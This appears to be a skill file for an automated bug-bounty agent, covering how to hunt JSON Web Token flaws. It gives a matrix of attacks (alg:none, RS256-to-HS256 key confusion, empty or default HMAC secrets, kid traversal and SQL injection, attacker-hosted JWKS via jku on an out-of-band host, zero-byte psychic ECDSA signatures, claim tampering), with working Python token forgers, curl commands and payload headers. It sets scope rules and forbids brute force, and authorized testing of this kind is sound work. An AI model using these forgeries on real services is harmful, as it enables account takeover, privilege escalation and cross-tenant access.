---
name: hunt-jwt
description: "Hunt JSON Web Token flaws — alg:none / alg-casing, RS256->HS256 key confusion (sign with the RSA public key as the HMAC secret), empty HMAC secret / unknown-kid fallback, kid header injection (path traversal / SQLi), jku/x5u/jwk/x5c header pointing at an attacker JWKS, claim tampering (sub/role/tenant/aud), missing expiry or no server-side revocation (replay after logout), access/refresh/audience token confusion, nested JWT / crit / psychic-signatures. Use whenever a request carries an eyJ... token in a header, cookie, or body. Respects the no-bruteforce rule: test only known-default / leaked secrets, never keyspace exhaustion."
sources: 0xray-authored
---

# HUNT-JWT — JSON Web Token Attacks

## Rails
- In-scope only. Read-only by default. State-changing proofs only on test accounts you own.
- **No keyspace cracking.** Try known-default / leaked HMAC secrets only — never rockyou, hashcat, or jwt_tool dictionary mode.
- Prove the primitive **once** (one forged token → one privileged action). No mass-forging.
- STOP at draft. Claim only a server-accepted token plus a real action.

## Decode first (no network)
Every `eyJ…` is `header.payload.signature` (base64url). Record `alg`, `kid`, `jku`/`x5u`/`jwk`/`x5c`, `typ`/`cty`/`crit`, and claims `sub`, `role`/`scope`/`groups`, `tid`/`org`, `aud`, `iss`, `azp`, `exp`/`nbf`/`iat`, `jti`. Attacks follow what the **header asks the server to trust**.

```bash
b64url(){ local s="${1//-/+}"; s="${s//_//}"; printf '%s' "$s===" | base64 -d 2>/dev/null; }
IFS=. read -r H P S <<<"$JWT"
echo "H=$(b64url "$H")"; echo "P=$(b64url "$P")"; echo "sig_len=${#S}"
```

**Pays:** forged/replayed token **accepted** AND a **cross-account or privileged action**. Decode-only, "looks weak", or a correctly-rejected token is not a finding.

## Decision tree (any stack)
1. Where does the token live? (`Authorization: Bearer`, cookie, body, query, WS subprotocol.) Query-string JWTs also leak via Referer/logs (`hunt-session`).
2. Grab verification material: `/.well-known/openid-configuration` → `jwks_uri`, `/jwks.json`, embedded PEM, mobile/APK, JS bundle. If the JWKS itself contains `{"kty":"oct","k":"..."}`, that `k` value IS the HMAC secret — base64url-decode it and sign directly (misconfigured servers do publish symmetric keys in JWKS). **Do not brute the secret.**
3. Walk the attack matrix below in order. After **any** accepted forge, immediately try claim tampering (`sub`/`role`/`tid`/`aud`) on a protected route.
4. If signature checks hold, test **acceptance bugs**: `aud`/`iss` not bound, refresh/access confusion, no `exp`, no revocation after logout/password-change.
5. Hand session-layer persistence to `hunt-session`; hand ATO chains to `hunt-ato`.

## Attack matrix

| # | Class | Probe (copy-paste shape) | Confirm |
|---|---|---|---|
| 1 | **alg:none** | Header `{"alg":"none"}` / `None` / `NONE` / `nOnE` / `nONE`; drop sig **or** keep `header.payload.` (trailing dot). Some libs only skip verify when `alg` is lowercase `none`. | Forged `sub`/role accepted on `/api/me` or admin route. |
| 2 | **RS256→HS256 confusion** | Download RSA public key (JWKS/`x5c`/TLS). Re-sign **HS256 using the public-key bytes as the HMAC secret**. Try three byte strings: PEM including the `BEGIN` line and its trailing newline, the base64 body decoded to DER, and `openssl pkey -pubin -outform DER`. Same confusion for an EC public key (`ES256`→`HS256`). Also `HS384`/`HS512`. | Server still trusts header `alg` → HMAC verifies against the public key it already holds. |
| 3 | **Known/leaked HMAC secret** | Only: `secret`, `changeme`, framework default (`jwt-secret`, `your-256-bit-secret`, `HS256KEY`), values from JS/APK/`.env`/`hunt-source-leak`. **Also one empty-key probe:** header `{"alg":"HS256","kid":"missing"}`, sign with `b""`. Unknown-`kid` resolvers of the form `keys[kid] \|\| ''` accept HMAC-SHA256 of an empty secret (fast-jwt / libjwt class). Same bytes as signing with `""`. | Forged token accepted. **Stop** — do not wordlist. Empty-key reject is a negative, not a finding. |
| 4 | **kid injection** | `"kid":"../../../dev/null"` (empty file as key — Unix); `"kid":"/dev/null"`; a path whose **bytes you already know** (uploaded file, public static file); SQLi `"kid":"x' UNION SELECT 'deadbeef'--"`; LDAP/file URI. Empty-secret without a file is row 3. | Server verifies against a key **you** control or empty. Unknown file bytes are not a forge. |
| 5 | **jku / x5u / jwk / x5c** | Point `jku`/`x5u` at attacker JWKS (`https://OOB/jwks.json`); embed `"jwk":{your RSA}`; inject `"x5c":["<attacker cert>"]`. Also SSRF: `jku=http://169.254.169.254/` (`hunt-ssrf`). | Server fetches **your** key and accepts **your** signature. OOB DNS/HTTP proves the fetch. |
| 6 | **crit / cty nested JWT** | `"crit":["bork"]` — RFC 7515 requires reject-if-unknown; some libs ignore `crit` and accept. `"cty":"JWT"` with payload = another JWT (inner unsigned). | Outer verifies, inner claims used for authz. |
| 7 | **ECDSA psychic signatures** | For `ES256` (P-1363, not ASN.1): signature is 64 zero bytes. Java 15–18 **unpatched** for CVE-2022-21449 accepted `r=0` or `s=0`. `ES384` is 96 zero bytes, `ES512` is 132. | Unsigned-equivalent token accepted. Patched Java rejecting it is not a finding. |
| 8 | **Claim tampering** | Once you can sign (or if server does not verify): flip `role`/`is_admin`/`scope`/`groups`/`cognito:groups`/`tid`/`org_id`/`sub`/`aud`. | Privileged or cross-tenant action, not just a decoded claim. |
| 9 | **aud / iss / azp confusion** | Token minted for service A (`aud=api-a` or `kubernetes`) presented to service B. Skip `aud` entirely; duplicate `aud` array; `azp` ≠ `aud`. Also: a token minted by a sibling environment (staging/dev issuer) whose signing keys prod also trusts. | Cross-audience access (Argo CD-class). |
| 10 | **Access / refresh / id_token mix** | Send refresh token as Bearer; send `id_token` to API; send API token to `/userinfo`. | Wrong token type accepted with broader claims. |
| 11 | **exp / jti / revocation** | Replay after logout, password change, email change. Missing `exp`, `exp` years out, missing `jti`. | Same JWT still returns **unique identity marker** (body-diff). See `hunt-session`. |
| 12 | **JWKS / issuer takeover** | `jwks_uri` on a dangling host, attacker-writable CDN, or Host-header-poisoned discovery (`hunt-host-header`, `hunt-subdomain`). Also a token `iss` the API uses as a JWKS base with no allowlist (`https://OOB/.well-known/openid-configuration`). | You sign with the new JWKS the API now trusts. An OOB hit without an accepted token is SSRF only. |

### alg:none
```python
import base64, json
def b64(o):
    return base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
print(b64({"alg":"none","typ":"JWT"})+"."+b64({"sub":"OTHER_TEST_USER","role":"admin"})+".")
# also: None / NONE / nOnE; and the two-dot form with leftover junk signature stripped
```

### RS256 → HS256
```bash
curl -s https://$TARGET/.well-known/openid-configuration | jq -r .jwks_uri
curl -s https://$TARGET/.well-known/jwks.json
openssl pkey -pubin -in pub.pem -outform DER -out pub.der 2>/dev/null || openssl rsa -pubin -in pub.pem -outform DER -out pub.der
```
```python
import hmac, hashlib, base64, json
def b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def token(secret, alg="HS256"):
    h = b64(json.dumps({"alg":alg,"typ":"JWT"},separators=(",",":")).encode())
    p = b64(json.dumps({"sub":"OTHER_TEST_USER","role":"admin"},separators=(",",":")).encode())
    sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64(sig)}"
pem = open("pub.pem","rb").read()
print(token(pem))                 # PEM bytes, headers and newline included
print(token(open("pub.der","rb").read()))
print(token(b""))                 # empty HMAC (row 3 unknown-kid fallback)
```
Sign only. No wordlist, no `jwt_tool` crack mode.

### Psychic signature (ES256)
JWS uses raw `r||s`, 32+32 bytes, not ASN.1. Sixty-four zero bytes is 86 `A`s:
```
<header>.<payload>.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
Header `alg` stays `ES256`. One request. A reject means the JVM is patched.

### jku / jwk injection
```json
{"alg":"RS256","jku":"https://UNIQUE.oastify.com/jwks.json","kid":"attacker"}
{"alg":"RS256","iss":"https://UNIQUE.oastify.com","kid":"attacker"}
{"alg":"RS256","jwk":{"kty":"RSA","kid":"atk","n":"<your n>","e":"AQAB"}}
```
Host a JWKS with your public key. Unique OOB hostname = proof the server fetched it.

## Tooling
Burp **JWT Editor** (none / key-confusion / claim edit). `openssl` for PEM. Decode by hand. Confirm against a **real protected endpoint**, not a public landing page.

## Validation (mandatory)
- **Accepted + action:** forged/replayed token used on an authenticated route that returns **victim/admin unique data** or performs a state change you can see on a second channel.
- **Body-diff:** 200 with a SPA shell / empty user is not impact. Diff vs unauthenticated and vs attacker-identity baseline.
- **Negative control:** random/garbage token must fail where yours succeeds.
- **OOB:** `jku`/`x5u`/JWKS fetch → unique Collaborator hit. SSRF-only DNS without using the fetched key to auth is `hunt-ssrf`, not JWT auth bypass.
- **No theoretical cracking:** "HMAC might be weak" without an accepted forge is not a finding.

**Severity:** none/key-confusion/jku → admin or any-user ATO = **Critical**. Cross-tenant `tid` flip = **High–Critical**. Replay after logout (no privileged change) = **Medium–High** (`hunt-session`). `alg` reflected but rejected = **not a finding**.

## Chains
| Primitive | Compose into | Impact |
|---|---|---|
| alg:none / key confusion / empty HMAC | `sub`=victim, `role`=admin | ATO / priv-esc (`hunt-ato`) |
| `jku`/`x5u` | SSRF + key inject | Auth bypass + internal fetch (`hunt-ssrf`) |
| `kid` path/SQLi | File read or key oracle | Forged tokens at will |
| `aud` skip | Token from IdP-A used on API-B | Cross-service impersonation (`hunt-auth-bypass`) |
| No revocation | Stolen JWT + XSS/CSWSH | Persistent ATO (`hunt-session`, `hunt-xss`) |
| Refresh as access | Long-lived token on API | Survives access-token TTL |

Cross-refs: `hunt-auth-bypass`, `hunt-ato`, `hunt-session`, `hunt-oauth`, `hunt-ssrf`, `hunt-source-leak`, `security-arsenal`, `triage-validation`.

## Dedup gate
```bash
python3 engine/dedup.py check --program <program> --class auth-bypass --url "<endpoint>" --title "<title>"
```
`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless a concrete differentiator (endpoint/param/impact or fix bypass).
